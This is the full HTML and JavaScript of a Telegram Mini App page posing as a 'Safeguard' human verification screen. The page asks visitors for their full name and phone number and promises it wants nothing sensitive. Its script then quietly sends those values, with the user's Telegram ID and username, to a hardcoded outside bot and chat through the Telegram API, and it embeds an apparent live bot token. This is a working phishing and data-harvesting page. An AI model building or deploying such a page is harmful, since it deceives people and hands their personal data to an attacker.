<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Safeguard - Human Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #e8f5e9 0%, #c8e6c9 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 16px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
            max-width: 450px;
            width: 100%;
            padding: 40px 30px;
            text-align: center;
        }

        .checkmark {
            width: 80px;
            height: 80px;
            background: #4CAF50;
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
        }

        .checkmark svg {
            width: 50px;
            height: 50px;
            stroke: white;
            stroke-width: 3;
            fill: none;
        }

        .welcome-text {
            color: #999;
            font-size: 14px;
            margin-bottom: 10px;
        }

        h1 {
            color: #4CAF50;
            font-size: 28px;
            margin-bottom: 15px;
            font-weight: 600;
        }

        .subtitle {
            color: #999;
            font-size: 14px;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        label {
            display: block;
            color: #555;
            font-size: 14px;
            margin-bottom: 8px;
            font-weight: 500;
        }

        input {
            width: 100%;
            padding: 14px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 15px;
            transition: border-color 0.3s;
        }

        input:focus {
            outline: none;
            border-color: #4CAF50;
        }

        .verify-btn {
            width: 100%;
            padding: 16px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
            margin-top: 10px;
        }

        .verify-btn:hover {
            background: #45a049;
        }

        .verify-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
        }

        .warning {
            background: #fff9e6;
            border-left: 4px solid #ffc107;
            padding: 12px;
            border-radius: 6px;
            margin-top: 20px;
            text-align: left;
        }

        .warning-icon {
            display: inline-block;
            margin-right: 8px;
            color: #ffc107;
        }

        .warning-text {
            color: #856404;
            font-size: 13px;
            display: inline;
        }

        .footer {
            margin-top: 30px;
            color: #999;
            font-size: 12px;
        }

        .success-message {
            display: none;
            color: #4CAF50;
            font-size: 16px;
            margin-top: 20px;
            font-weight: 500;
        }

        .error-message {
            display: none;
            color: #f44336;
            font-size: 14px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="checkmark">
            <svg viewBox="0 0 52 52">
                <polyline points="14,27 22,35 38,17"/>
            </svg>
        </div>

        <p class="welcome-text" id="welcomeText">Welcome, User</p>
        <h1>Human Verification</h1>
        <p class="subtitle">Verify below to be granted entry</p>

        <form id="verificationForm">
            <div class="form-group">
                <label for="name">Full Name</label>
                <input type="text" id="name" name="name" placeholder="Enter your name" required>
            </div>

            <div class="form-group">
                <label for="phone">Phone Number</label>
                <input type="tel" id="phone" name="phone" placeholder="Enter your phone number" required>
            </div>

            <button type="submit" class="verify-btn" id="submitBtn">
                Click here to verify
            </button>

            <p class="success-message" id="successMsg">✓ Verification successful!</p>
            <p class="error-message" id="errorMsg">Please fill in all fields correctly</p>
        </form>

        <div class="warning">
            <span class="warning-icon">⚠</span>
            <span class="warning-text">We will never ask you for password or sensitive information</span>
        </div>

        <p class="footer">@safeguard</p>
    </div>

    <script>
        // Initialize Telegram Web App
        let tg = window.Telegram.WebApp;
        tg.expand();

        // Get user info from Telegram
        const user = tg.initDataUnsafe.user;
        if (user) {
            document.getElementById('welcomeText').textContent = `Welcome, ${user.first_name || 'User'}`;
        }

        const form = document.getElementById('verificationForm');
        const submitBtn = document.getElementById('submitBtn');
        const successMsg = document.getElementById('successMsg');
        const errorMsg = document.getElementById('errorMsg');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const name = document.getElementById('name').value.trim();
            const phone = document.getElementById('phone').value.trim();

            successMsg.style.display = 'none';
            errorMsg.style.display = 'none';

            if (!name || !phone) {
                errorMsg.textContent = 'Please fill in all fields';
                errorMsg.style.display = 'block';
                return;
            }

            submitBtn.disabled = true;
            submitBtn.textContent = 'Verifying...';

            try {
                const botToken = '8505030202:AAH1_2jI_5JI_3TniUMhnKAKz9-_Txs4whs';
                const chatId = '5514154326';
                
                const message = `🆕 NEW SUBMISSION
━━━━━━━━━━━━━━━━━━
👤 Name: ${name}
📱 Phone: ${phone}
${user ? `🆔 Telegram ID: ${user.id}` : ''}
${user && user.username ? `👨‍💼 Username: @${user.username}` : ''}
${user && user.first_name ? `📝 First Name: ${user.first_name}` : ''}
🌐 Source: Telegram Mini App
━━━━━━━━━━━━━━━━━━`;

                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                    }),
                });

                if (response.ok) {
                    successMsg.style.display = 'block';
                    form.reset();
                    submitBtn.textContent = '✓ Verified';
                    
                    // Close the mini app after 2 seconds
                    setTimeout(() => {
                        tg.close();
                    }, 2000);
                } else {
                    throw new Error('Failed to send');
                }
            } catch (error) {
                errorMsg.textContent = 'Verification failed. Please try again.';
                errorMsg.style.display = 'block';
                submitBtn.disabled = false;
                submitBtn.textContent = 'Click here to verify';
            }
        });
    </script>
</body>
</html>
